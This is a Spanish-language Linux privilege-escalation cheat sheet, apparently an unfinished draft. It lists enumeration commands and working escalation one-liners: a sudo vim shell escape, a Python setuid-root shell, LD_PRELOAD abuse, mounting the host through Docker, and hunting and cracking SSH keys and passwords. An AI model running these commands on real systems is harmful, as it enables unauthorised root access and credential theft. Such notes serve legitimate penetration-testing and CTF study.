## Content:
- Enumeration
- SUID
- Sudo Permissions
- Cron Jobs
- Capabilities
- Weak Permissions
- SSH
- Kernel Exploits
- NFS
- Docker / LXC
- Environment Variables
- PATH Hijacking
- Wildcards Abuse
- Credential Hunting
- Sensitive Files
- Log Files
- Services
- Scripts Analysis
- Password Reuse
- Tools
- References

## 1. Enumeration 

Antes de explotar nada:
- whoami
- id
- hostname
- uname -a
- cat /etc/os-release

Usuarios:
- cat /etc/passwd
- cat /etc/group
- last
- w

Procesos:
- ps aux
- ps aux | grep root

Red:
 - ip a
- netstat -tulpn
- ss -tulpn

## 2. SUID

Buscar SUID:

- find / -perm -4000 -type f 2>/dev/null

Buscar binarios vulnerables:

- find / -perm -u=s -type f 2>/dev/null

Ejemplos:
/usr/bin/python
/usr/bin/vim
/usr/bin/nmap
/usr/bin/find

## 3. Sudo Permissions
- sudo -l

Buscar:
- NOPASSWD
- comandos permitidos
- versiones vulnerables

Ejemplo:
- sudo vim

Escalada:
- :!bash

## 4. Cron Jobs

Buscar tareas:
- cat /etc/crontab
- ls -la /etc/cron*

Buscar scripts:
- find / -name "*.sh" 2>/dev/null

Puntos a revisar:
- scripts ejecutados como root
- permisos de escritura
- PATH inseguro

## 5. Linux Capabilities

Buscar:
- getcap -r / 2>/dev/null

Ejemplo:
- /usr/bin/python3 cap_setuid+ep

Puede permitir:
import os
os.setuid(0)
os.system("/bin/bash")

## 6. Weak Permissions:
Archivos modificables:
find / -writable -type f 2>/dev/null

Directorios:
find / -writable -type d 2>/dev/null

Ejemplos:
- scripts root modificables
- archivos de configuración
- servicios

## 7. PATH Hijacking

Comprobar PATH:
- echo $PATH

Buscar scripts:
- strings /path/to/file

Script:
- service apache restart

Si no usa ruta absoluta:
- /usr/bin/service

## 8. Environment Variables

Variables interesantes:
- env

Buscar:
- LD_PRELOAD
- LD_LIBRARY_PATH

Ejemplo:
- sudo LD_PRELOAD=/tmp/library.so program

## 9. Kernel Exploits

Información:
- uname -r

Buscar vulnerabilidades
- DirtyPipe
- DirtyCow
- OverlayFS

Herramientas:
- linux-exploit-suggester
- LES

## 10. Docker / LXC

Comprobar:
- id

Si aparece:
- docker
puede ser escalada.

Ejemplo:
- docker images
- docker run -v /:/mnt alpine chroot /mnt bash

11. NFS
Buscar:
- cat /etc/exports

Problema:
- no_root_squash
Puede permitir root remoto.

## 12. Credential Hunting

Buscar:
- grep -R "password" /home 2>/dev/null

Archivos:
- find / -name "*.conf"
- find / -name "*.txt"
- find / -name "*.bak"

Sitios:
- .bash_history
- .config
- .ssh
- .env

## 13. SSH

Buscar claves:
- find / -name id_rsa 2>/dev/null

Permisos:
- ls -la ~/.ssh/

Crack:
- ssh2john id_rsa
- john hash

14. Tools

Añadir una sección:

## 14. Tools
- LinPEAS
- Linux Exploit Suggester
- pspy
- GTFOBins
- LSE
- ltrace
- strace
